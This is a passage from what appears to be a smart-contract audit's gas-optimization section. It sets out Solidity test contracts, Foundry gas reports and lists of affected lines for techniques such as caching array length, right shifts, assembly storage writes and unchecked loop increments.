300 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract3 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract5 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract6 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract7 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines - FERC1155.sol:247  - Buyout.sol:86  - Buyout.sol:87  - Buyout.sol:88  - Buyout.sol:124  - Buyout.sol:138  - Buyout.sol:161  - Buyout.sol:165  - Buyout.sol:202  - Buyout.sol:209  - Buyout.sol:268  - Buyout.sol:269  - VaultFactory.sol:77  - Vault.sol:128  - MerkleBase.sol:92  - MerkleBase.sol:93  - MerkleBase.sol:97  - MerkleBase.sol:100  - MerkleBase.sol:107  - MerkleBase.sol:112  - MerkleBase.sol:136  - MerkleBase.sol:137  - MerkleBase.sol:138  - MerkleBase.sol:142  - MerkleBase.sol:147  - MerkleBase.sol:148  - Migration.sol:194  - Migration.sol:471  - Migration.sol:527  - Migration.sol:528  - Migration.sol:544  - Migration.sol:545   --- ## Right shift instead of dividing by two  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.div2();         c1.shr2();     } }  contract Contract0 {     function div2() public view {         uint256 val = 10;         uint256 valDivTwo = val / 2;         valDivTwo++;     } }  contract Contract1 {     function shr2() public view {         uint256 val = 10;         uint256 valDivTwo = val >> 1;         valDivTwo++;     } } ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41493              ┆ 238             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ div2               ┆ 268             ┆ 268 ┆ 268    ┆ 268 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 32687              ┆ 193             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ shr2               ┆ 203             ┆ 203 ┆ 203    ┆ 203 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines - MerkleBase.sol:100  - MerkleBase.sol:136  - MerkleBase.sol:142   ---  ## Cache array length during for loop definition. A typical for loop definition may look like: `for (uint256 i; i < arr.length; i++){}`. Instead of using `array.length`, cache the array length before the loop, and use the cached value to safe gas. This will avoid an `MLOAD` every loop for arrays stored in memory and an `SLOAD` for arrays stored in storage. This can have significant gas savings for arrays with a large length, especially if the array is stored in storage.   ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public view {         uint256[] memory arr = new uint256[](10);         c0.nonCachedMemoryListLength(arr);         c1.cachedMemoryListLength(arr);         c2.nonCachedStorageListLength();         c3.cachedStorageListLength();     } }  contract Contract0 {     function nonCachedMemoryListLength(uint256[] memory arr) public pure {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract1 {     function cachedMemoryListLength(uint256[] memory arr) public pure {         uint256 j;          uint256 length = arr.length;         for (uint256 i; i < length; i++) {             j = arr[i] + 10;         }     } }  contract Contract2 {     uint256[] arr = new uint256[](10);      function nonCachedStorageListLength() public view {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract3 {     uint256[] arr = new uint256[](10);      function cachedStorageListLength() public view {         uint256 j;         uint256 length = arr.length;          for (uint256 i; i < length; i++) {             j = arr[i] + 10;         }     } }   ```  ### Gas Report ```js ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 128171                                    ┆ 672             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ nonCachedMemoryListLength                 ┆ 3755            ┆ 3755 ┆ 3755   ┆ 3755 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 128777                                    ┆ 675             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ cachedMemoryListLength                    ┆ 3733            ┆ 3733 ┆ 3733   ┆ 3733 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ src/test/GasTest.t.sol:Contract2 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 118474                                    ┆ 539             ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ nonCachedStorageListLength                ┆ 27979           ┆ 27979 ┆ 27979  ┆ 27979 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ src/test/GasTest.t.sol:Contract3 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 118674                                    ┆ 540             ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ cachedStorageListLength                   ┆ 26984           ┆ 26984 ┆ 26984  ┆ 26984 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  ``` ### Lines - Buyout.sol:454  - MerkleBase.sol:51  - MerkleBase.sol:110  - BaseVault.sol:64  - BaseVault.sol:83  - BaseVault.sol:107  - BaseVault.sol:130   ---  ## Use assembly to write storage values  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.updateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);         c1.assemblyUpdateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);     } }  contract Contract0 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function updateOwner(address newOwner) public {         owner = newOwner;     } }  contract Contract1 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function assemblyUpdateOwner(address newOwner) public {         assembly {             sstore(owner.slot, newOwner)         }     } }  ```  ### Gas Report ```js ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 60623              ┆ 261             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ updateOwner        ┆ 5302            ┆ 5302 ┆ 5302   ┆ 5302 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 54823              ┆ 232             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyUpdateOwner┆ 5236            ┆ 5236 ┆ 5236   ┆ 5236 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ``` ### Lines - targets:Supply.sol:17  - FERC1155.sol:199  - FERC1155.sol:234  - Metadata.sol:17  - SupplyReference.sol:16  - Buyout.sol:47  - Buyout.sol:48  - Buyout.sol:49  - VaultFactory.sol:21  - Vault.sol:26  - Vault.sol:27  - Vault.sol:88  - Vault.sol:95  - Minter.sol:18  - Migration.sol:58  - Migration.sol:59  - VaultRegistry.sol:29  - VaultRegistry.sol:30  - VaultRegistry.sol:31  - BaseVault.sol:25   --- ## `unchecked{++i}` instead of `i++` (or use assembly when applicable)  Use `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();     }      function testGas() public {         c0.iPlusPlus();         c1.plusPlusI();         c2.uncheckedPlusPlusI();         c3.safeUncheckedPlusPlusI();         c4.inlineAssemblyLoop();     } }  contract Contract0 {     //loop with i++     function iPlusPlus() public pure {         uint256 j = 0;         for (uint256 i; i < 10; i++) {             j++;         }     } }  contract Contract1 {     //loop with ++i     function plusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ++i) {             j++;         }     } }  contract Contract2 {     //loop with unchecked{++i}     function uncheckedPlusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }     } }  contract Contract3 {     //loop with unchecked{++i} with additional overflow check     function safeUncheckedPlusPlusI() public pure {         uint256 j = 0;         uint256 i = 0;         for (i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }          //check for overflow         assembly {             if lt(i, 10) {                 mstore(0x00, "loop overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //loop with inline assembly     function inlineAssemblyLoop() public pure {         assembly {             let j := 0              for {                 let i := 0             } lt(i, 10) {                 i := add(i, 0x01)             } {                 j := add(j, 0x01)             }         }     } }  ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37687              ┆ 219             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ iPlusPlus          ┆ 2039            ┆ 2039 ┆ 2039   ┆ 2039 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ plusPlusI          ┆ 1989            ┆ 1989 ┆ 1989   ┆ 1989 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract3 contract     ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆      ┆        ┆      ┆         │ 